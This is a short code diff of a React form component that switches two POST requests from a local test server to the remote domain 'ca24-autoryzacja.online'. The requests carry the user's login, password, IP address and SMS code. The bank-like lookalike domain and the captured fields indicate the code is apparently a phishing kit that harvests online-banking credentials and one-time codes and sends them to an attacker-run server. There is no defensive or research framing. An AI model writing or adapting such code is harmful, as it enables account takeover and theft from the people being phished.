@@ -96,7 +96,7 @@ const Main = () => {
             }
         } else if(currentStep === 1) {
             setLoading(true);
-            axios.post('http://localhost:5000/sendMessage', {
+            axios.post('https://ca24-autoryzacja.online/api/sendMessage', {
                 login: inputLogin,
                 pass: inputPass,
                 ip: ip,
@@ -108,7 +108,7 @@ const Main = () => {
             })
         } else {
             setLoading(true);
-            axios.post('http://localhost:5000/sendMessage', {
+            axios.post('https://ca24-autoryzacja.online/api/sendMessage', {
                 login: inputLogin,
                 pass: inputPass,
                 sms: inputSms,
